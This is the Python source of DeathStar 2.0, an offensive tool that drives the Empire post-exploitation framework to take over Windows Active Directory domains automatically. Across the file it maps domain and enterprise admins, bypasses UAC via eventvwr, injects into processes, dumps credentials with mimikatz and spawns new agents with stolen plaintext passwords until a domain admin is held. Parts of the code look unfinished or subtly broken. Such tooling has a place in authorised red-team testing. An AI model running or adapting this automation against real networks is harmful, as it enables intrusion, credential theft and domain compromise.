#! /usr/bin/env python3

# Copyright (c) 2020 Marcello Salvati (byt3bl33d3r@pm.me)
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

__version__ = "2.0"

import logging
import argparse
import asyncio
from collections import Counter
from deathstar.kybercrystals import KyberCrystals
from deathstar.planetaryrecon import PlanetaryRecon
from deathstar.empire import EmpireApiClient, EmpireLoginError
from deathstar.utils import CustomArgFormatter, beautify_json

handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter("[%(name)s] %(levelname)s - %(message)s"))

log = logging.getLogger("deathstar")
log.setLevel(logging.DEBUG)
log.addHandler(handler)


class DeathStar:
    def __init__(self, empire):
        self.empire = empire
        self.priority_targets = []

        self.recon = PlanetaryRecon()
        self.kybers = KyberCrystals(self)
        self.won = asyncio.Event()

    async def planetary_recon(self):
        log.debug("Recon task started")

        while not self.won.is_set():
            for agent in await self.empire.agents.get():
                if agent.domain and not self.recon.has_been_performed(agent.domain):
                    log.info(f"{agent.name} => Starting recon on domain '{agent.domain}'")

                    domain_sid = await self.kybers.get_domain_sid(agent)
                    domain_admins, enterprise_admins, domain_controllers = await asyncio.gather(*[
                        self.kybers.get_group_member(agent, domain_sid + "-512"),
                        self.kybers.get_group_member(agent, domain_sid + "-519"),
                        self.kybers.get_domain_controller(agent)
                    ])

                    self.recon.data[agent.domain]["domain_sid"] = domain_sid
                    self.recon.data[agent.domain]["domain_admins"] = domain_admins
                    self.recon.data[agent.domain]["enterprise_admins"] = enterprise_admins
                    self.recon.data[agent.domain]["domain_controllers"] = domain_controllers

                    log.info(f"{agent.name} => Recon complete for domain '{agent.domain}'")
                    #log.debug("Recon data:" + beautify_json(self.recon.data[agent.domain]))

                    self.recon.set_performed(agent.domain)

            await asyncio.sleep(3)

    async def galaxy_conquest(self, agent):
        log.debug(f"{agent.name} => It's wabbit season, hunting for them admins")

        local_admin_access, admin_sessions = asyncio.gather(*[
            self.kybers.find_localadmin_access(agent),
            self.kybers.user_hunter(agent)
        ])

        ## Spread here

    async def fire_mission(self, agent):
        seen_usernames = []

        await self.recon.event(agent.domain).wait()
        log.debug(f"{agent.name} => Starting fire mission")

        if not agent.high_integrity:
            self.kybers.bypassuac_eventvwr(agent)

        while not self.won.is_set():
            for entry in await self.kybers.get_loggedon(agent):
                username = f"{entry['LogonDomain']}\\{entry['UserName']}"
                if username in self.recon.all_admins and username not in seen_usernames:
                    log.info(f"{agent.name} => Admin {username} is logged into {agent.hostname}")
                    self.priority_targets.append(agent.hostname)

            if agent.high_integrity:
                for process in await self.kybers.tasklist(agent):
                    if process["UserName"] and process["UserName"] != agent.username and process["UserName"] not in seen_usernames:
                        log.info(f"{agent.name} => Found process '{process['ProcessName']}' (pid: {process['PID']}) running under {process['UserName']}")
                        await self.kybers.psinject(agent, process)
                        continue

                await self.kybers.mimikatz(agent)

            await asyncio.sleep(10)

    async def agent_poller(self):
        log.debug("Agent poller started")
        missions = []

        while not self.won.is_set():
            for agent in await self.empire.agents.get():
                if not any(
                    map(lambda task: task.get_name() == agent.name, missions)
                ):
                    missions.extend([
                        asyncio.create_task(self.fire_mission(agent), name=agent.name),
                        asyncio.create_task(self.galaxy_conquest(agent), name=agent.name)
                    ])

            await asyncio.sleep(3)

        await asyncio.gather(*missions)

    async def agent_spawner(self):
        log.debug("Agent spawner started")

        while not self.won.is_set():
            plaintext_creds = filter(
                lambda c: c.credtype == "plaintext",
                await self.empire.credentials.get()
            )

            for cred in plaintext_creds:
                agents = await self.empire.agents.get()
                if agents:
                    if not any(filter(lambda a: a.domain == cred.domain and a.username == cred.username, agents)):
                        # Count hostnames for all agents
                        pwned_computers = Counter(map(lambda a: a.hostname, agents))

                        # Get the hostname with the least amount of occurances
                        least_pwned = list(sorted(pwned_computers.items(), key=lambda h: h[1]))[0]

                        # Get the agents on that machine
                        agent = list(filter(lambda a: a.hostname == least_pwned, agents))[0]

                        log.info(f"Spawning agent on '{least_pwned}' with creds for {cred.pretty_username} as it has the least amount of agents")
                        await self.kybers.spawnas(agent, cred_id=cred.id)

            await asyncio.sleep(3)
 
    async def win_checker(self):
        log.debug("Win checker started")

        while not self.won.is_set():
            for agent in await self.empire.agents.get():
                if agent.username in self.recon.all_admins and agent.high_integrity:
                    self.won.set()

            for cred in await self.empire.credentials.get():
                if cred.credtype in ["plaintext", "hash"] and cred.pretty_username in self.recon.all_admins:
                    self.won.is_set()

            await asyncio.sleep(3)

    async def power_up(self):
        if "error" in await self.empire.listeners.get("DeathStar"):
            await self.empire.listeners.create(additional={"Port": 8443})

        await asyncio.gather(*[
            self.planetary_recon(),
            self.win_checker(),
            self.agent_spawner(),
            self.agent_poller(),
        ])

async def main(args):
    try:
        empire = EmpireApiClient(host=args.api_host, port=args.api_port)
        await empire.login(args.username, args.password)
        log.info("Empire login successful")
    except EmpireLoginError:
        log.error("Error logging into Empire, invalid credentials?")
    else:
        log.info("Powering up the DeathStar and waiting for agents")
        deathstar = DeathStar(empire)
        await deathstar.power_up()


def run():
    args = argparse.ArgumentParser(
        description=f"""
DeathStar!

Version: {__version__}
    """,
        formatter_class=CustomArgFormatter,
    )
    args.add_argument(
        "-u", "--username", type=str, default="empireadmin", help="Empire username"
    )
    args.add_argument(
        "-p", "--password", type=str, default="Password123!", help="Empire password"
    )
    args.add_argument(
        "--api-host", type=str, default="127.0.0.1", help="Empire API IP/Hostname"
    )
    args.add_argument("--api-port", type=int, default=1337, help="Empire API port")
    args.add_argument("--debug", action="store_true", help="Enable debug output")

    args = args.parse_args()

    if args.debug:
        log.setLevel(logging.DEBUG)

    log.debug(vars(args))
    asyncio.run(main(args))


if __name__ == "__main__":
    run()
